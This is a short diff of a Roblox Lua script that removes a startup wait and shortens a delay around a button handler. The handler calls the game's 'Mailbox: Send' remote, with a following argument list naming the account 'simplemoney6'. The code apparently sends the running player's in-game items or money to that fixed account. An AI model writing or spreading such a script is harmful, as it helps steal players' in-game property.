@@ -1,4 +1,4 @@
-wait(5)
+
 local function Dialogggg()
     while true do
 local player = game.Players.LocalPlayer
@@ -151,7 +151,7 @@ button.MouseButton1Click:Connect(function()
     }
 
     game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args1))
-    wait(3)
+    wait(1)
     local args2 = {
         [1] = "simplemoney6",
         [2] = "sent",
